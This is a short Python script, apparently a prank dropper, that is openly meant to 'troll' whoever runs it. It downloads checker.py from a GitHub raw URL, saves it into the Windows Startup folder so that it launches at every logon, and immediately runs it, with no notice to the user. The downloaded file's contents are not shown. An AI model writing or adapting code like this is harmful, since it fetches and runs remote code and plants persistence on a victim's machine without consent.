# Downloads and injects the files needed to troll your dumbass
def clone():
    import os, urllib.request, pathlib
    dlurl = 'https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/checker.py'
    home = os.path.expanduser("~") #pathlib.Path.cwd()
    path = str(home) + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\checker.py'
    urllib.request.urlretrieve(dlurl, '{}'.format(path))
    os.system('{}'.format(str(path)))
    sleep(2)
    print('worked')
    exit()
def sleep(Time):
    import time as t
    t.sleep(Time)
sleep(3)

clone()